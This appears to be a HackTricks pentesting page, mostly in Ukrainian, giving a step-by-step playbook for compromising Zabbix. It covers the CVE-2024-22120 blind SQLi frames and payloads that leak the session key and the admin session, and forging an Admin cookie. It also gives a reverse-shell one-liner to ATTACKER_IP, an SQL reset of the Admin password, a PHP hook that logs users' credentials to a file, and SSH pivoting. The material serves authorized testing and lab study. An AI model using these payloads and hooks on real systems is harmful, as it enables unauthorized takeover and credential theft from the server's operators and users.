# Zabbix Безпека

{{#include ../../banners/hacktricks-training.md}}

## Огляд

Zabbix — це платформа моніторингу, що надає веб-інтерфейс (зазвичай за Apache/Nginx) та серверний компонент, який також спілкується Zabbix протоколом на TCP/10051 (server/trapper) та агентом на TCP/10050. Під час перевірок ви можете зустріти:

- Web UI: HTTP(S) віртуальний хост, наприклад zabbix.example.tld
- Zabbix server port: 10051/tcp (JSON over a ZBXD header framing)
- Zabbix agent port: 10050/tcp

Корисний формат cookie: zbx_session — це Base64 компактного JSON-об'єкта, що містить принаймні sessionid, serverCheckResult, serverCheckTime та sign. sign — це HMAC від JSON payload.

## zbx_session cookie internals

Recent Zabbix versions compute the cookie like:

- data JSON: {"sessionid":"<32-hex>","serverCheckResult":true,"serverCheckTime":<unix_ts>}
- sign: HMAC-SHA256(key=session_key, data=JSON string of data sorted by keys and compact separators)
- Final cookie: Base64(JSON_with_sign)

Якщо ви зможете відновити глобальний session_key та дійсний admin sessionid, ви зможете сфабрикувати дійсний Admin cookie офлайн і аутентифікуватися в UI.

## CVE-2024-22120 — Time-based blind SQLi у журналі аудиту Zabbix Server

Affected versions (as publicly documented):

- 6.0.0–6.0.27, 6.4.0–6.4.12, 7.0.0alpha1

Короткий опис вразливості:

- When a Script execution is recorded into the Zabbix Server audit log, the clientip field is not sanitized and is concatenated into SQL, enabling time-based blind SQLi via the server component.
- Це експлуатується шляхом відправлення спеціально сформованого запиту "command" на порт сервера Zabbix 10051 з дійсним низькоправовим sessionid, hostid, до якого користувач має доступ, та дозволеним scriptid.

Передумови та поради щодо виявлення:

- sessionid: Через guest/login у веб-інтерфейсі, декодуйте zbx_session (Base64), щоб отримати sessionid.
- hostid: Спостерігайте через запити веб-інтерфейсу (наприклад, Monitoring → Hosts) або перехопіть через проксі; типовий дефолт часто 10084.
- scriptid: Виконаються лише скрипти, дозволені для поточної ролі; перевірте, інспектуючи меню скриптів/AJAX-відповіді. За замовчуванням значення на кшталт 1 або 2 часто дозволені; 3 може бути забороненим.

### Потік експлуатації

1) Спровокувати вставку в журнал аудиту з SQLi у clientip

- Підключіться до TCP/10051 і надішліть Zabbix фреймоване повідомлення з request="command", що містить sid, hostid, scriptid, а поле clientip встановіть як SQL-вираз, який буде конкатенований сервером і виконаний.

Minimal message (JSON body) fields:
```json
{
"request": "command",
"sid": "<low-priv-sessionid>",
"scriptid": "1",
"clientip": "' + (SQL_PAYLOAD) + '",
"hostid": "10084"
}
```
Повний wire формат: "ZBXD\x01" + 8-byte little-endian length + UTF-8 JSON. Можна використовувати pwntools або власний socket-код для формування цього кадру.

2) Time-bruteforce secrets via conditional sleep

Використовуйте умовні вирази, щоб leak секрети, закодовані в hex, по 1 символу за раз, вимірюючи час відповіді. Приклади, які спрацювали на практиці:

- Leak global session_key from config:
```sql
(select CASE WHEN (ascii(substr((select session_key from config),{pos},1))={ord}) THEN sleep({T_TRUE}) ELSE sleep({T_FALSE}) END)
```
- Leak Admin session_id (userid=1) із sessions:
```sql
(select CASE WHEN (ascii(substr((select sessionid from sessions where userid=1 limit 1),{pos},1))={ord}) THEN sleep({T_TRUE}) ELSE sleep({T_FALSE}) END)
```
Notes:

- charset: 32 hex chars [0-9a-f]
- Виберіть T_TRUE >> T_FALSE (наприклад, 10 vs 1) і вимірюйте реальний час (wall-clock) для кожної спроби
- Переконайтеся, що ваш scriptid дійсно авторизований для користувача; інакше не буде створено рядка аудиту і вимірювання часу не спрацює

3) Forge Admin cookie

Once you have:

- session_key: 32-hex from config.session_key
- admin_sessionid: 32-hex from sessions.sessionid for userid=1

Compute:

- sign = HMAC_SHA256(key=session_key, data=json.dumps({sessionid, serverCheckResult:true, serverCheckTime:now}, sort by key, compact))
- zbx_session = Base64(JSON_with_sign)

Set the cookie zbx_session to this value and GET /zabbix.php?action=dashboard.view to validate Admin access.

### Ready-made tooling

- Public PoC automates: bruteforce of session_key and admin sessionid, and cookie forging; requires pwntools and requests.
- Parameters to provide typically include: --ip (FQDN of UI), --port 10051, --sid (low-priv), --hostid, and optionally a known --admin-sid to skip brute.

## RCE via Script execution (post-Admin)

With Admin access in the UI, you can execute predefined Scripts against monitored hosts. If agents/hosts execute script commands locally, this yields code execution on those systems (often as the zabbix user on Linux hosts):

- Quick check: run id to confirm user context
- Reverse shell example:
```bash
bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1'
```
Покращення TTY (Linux):
```bash
script /dev/null -c bash
# background with Ctrl+Z, then on attacker terminal:
stty raw -echo; fg
reset
```
Якщо у вас є доступ до DB, альтернативою підробці cookie є скидання пароля Admin до задокументованого bcrypt для "zabbix":
```sql
UPDATE users SET passwd='$2a$10$ZXIvHAEP2ZM.dLXTm6uPHOMVlARXX7cqjbhM6Fn0cANzkCQBWpMrS' WHERE username='Admin';
```
## Захоплення облікових даних через login hook (post-exploitation)

Якщо на сервері веб-інтерфейсу доступний запис файлів, ви можете тимчасово додати фрагмент логування у /usr/share/zabbix/index.php навколо гілки form-based login, щоб захопити облікові дані:
```php
// login via form
if (hasRequest('enter') && CWebUser::login(getRequest('name', ZBX_GUEST_USER), getRequest('password', ''))) {
$user = $_POST['name'] ?? '??';
$password = $_POST['password'] ?? '??';
$f = fopen('/dev/shm/creds.txt','a+'); fputs($f, "$user:$password\n"); fclose($f);
CSessionHelper::set('sessionid', CWebUser::$data['sessionid']);
}
```
Користувачі автентифікуються як зазвичай; прочитайте /dev/shm/creds.txt після цього. Видаліть hook після завершення.

## Pivoting до внутрішніх сервісів

Навіть якщо shell сервісного облікового запису — /usr/sbin/nologin, додавання запису в SSH authorized_keys і використання -N -L дозволяють локальний port-forwarding до loopback-only сервісів (наприклад, CI/CD на 8111):
```bash
ssh -i key user@host -N -L 8111:127.0.0.1:8111
```
Більше шаблонів тунелювання: див. [Tunneling and Port Forwarding](../../generic-hacking/tunneling-and-port-forwarding.md).

## Практичні поради

- Перевірте, чи scriptid дозволено для поточної ролі (guest може мати обмежений набір)
- Timing brute може бути повільним; збережіть у кеші відновлений admin sessionid і використовуйте його повторно
- JSON, який відправляється на 10051, має бути обрамлений заголовком ZBXD\x01 і довжиною у little-endian

## Джерела

- [HTB Watcher — Zabbix CVE-2024-22120 to Admin/RCE and TeamCity root pivot](https://0xdf.gitlab.io/2025/10/09/htb-watcher.html)
- [CVE-2024-22120-RCE toolkit (PoC scripts)](https://github.com/W01fh4cker/CVE-2024-22120-RCE)

{{#include ../../banners/hacktricks-training.md}}
